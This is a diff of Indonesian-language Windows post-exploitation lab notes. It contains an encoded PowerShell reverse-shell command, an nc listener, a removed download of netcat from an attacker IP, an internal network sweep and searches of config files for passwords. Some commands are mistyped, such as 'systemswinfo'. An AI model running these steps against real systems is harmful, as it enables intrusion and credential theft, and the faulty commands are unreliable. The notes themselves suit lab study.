@@ -16,10 +16,7 @@ powershell -enc cABvAHcAZQByAHMAaABlAGwAbAAgAC0AbgBvAHAAIAAtAGMAIAAiACQAYwBsAGkA
 rlwrap nc -lvnp 4444
 ```
 ![](Attachments/Pasted%20image%2020260629092222.png)
-## c. Sent nc
-```powershell
-iwr -uri http://10.10.15.236:8088/nc_64_bits.exe -OutFile nc_64_bits.exe
-```
+
 # 1. User.txt
 ## Cari User di directory lain
 ```powershell
@@ -29,11 +26,13 @@ dir C:\Users\*\Desktop\user.txt /s /b 2>nul
 # Atau lebih luas
 dir C:\Users\ /s /b 2>nul | findstr /i "user.txt\|local.txt\|proof.txt"
 ```
-# 2. Enum
-## a. Chek infra
+# 2. Enumeration
+## a. System Information
+Untuk melihat ==OS Name== dan ==System Type==
 ```powershell
-# Untuk CMD
-sysinfo
+# Untuk CMD 
+systemswinfo
+
 echo %PROCESSOR_ARCHITECTURE%
 
 # Untuk Powershell
@@ -41,41 +40,57 @@ $env:PROCESSOR_ARCHITECTURE
 ```
 ![](Attachments/Pasted%20image%2020260814104031.png)
 ![](Attachments/Pasted%20image%2020260824130947.png)
-## b. Siapa saya?
-```powershell
-h
-whoami /priv #dahulukan ini
-whoami /group
-systeminfo
-```
-![](Attachments/Pasted%20image%2020260625053212.png)
-
 cek windows version use `systeminfo` command
 ![](Attachments/Pasted%20image%2020260629103715.png)
-## c dimana saya?
+## b. Antivirus
+cek status ==RUNNING== atau tidak
+```powershell
+sc query windefend
+```
+## c. User Information
+```powershell
+net user <nama user>
+host
+whoami /priv #dahulukan ini
+whoami /group
+```
+![](Attachments/Pasted%20image%2020260625053212.png)
+yang berbahaya  pada whoami /priv
+- ==SeImpersonatePrivilege== -> ini yang paling bahaya
+
+## d. Group Information
+```powershell
+net user
+net localgroup administrators
+```
+![](Attachments/Pasted%20image%2020260625054311.png)
+## e. Network Information
 ```powershell
 hostname #cek komputer apa
 ipconfig #cek apakah ada another network
 ```
 pada gambar dibawah ada another network
 ![](Attachments/Pasted%20image%2020260625053943.png)
-
-## d. Scan internal network
+Scan ip apa saja yang aktif
 ```powershell
 1..255 | ForEach-Object { $ip = "192.168.100.$_"; if (Test-NetConnection -ComputerName $ip -InformationLevel Quiet -ErrorAction SilentlyContinue) { $ip } }
 ```
 ![](Attachments/Pasted%20image%2020260625094620.png)
-## e. Siapa saja usernya?
-```powershell
-net usern
-net localgroup administrator
-```
-![](Attachments/Pasted%20image%2020260625054311.png)
 ## f. Cek Share
 ```powershell
 cd C:\Shares\
 ```
+## g. Password file
+```powershell
+# CMD
+findstr /si password *.ini *.config
 
+# powershell
+Get-ChildItem -Include *.ini, *.config -Recurse | Select-String "password"
+
+# Current folder
+Select-String -Path * -Pattern "password" 
+```
 # 3. Schedule Task
 ## Siapa yang menjalankan program UpdateChecker Agent (misal)?
 ```powershell
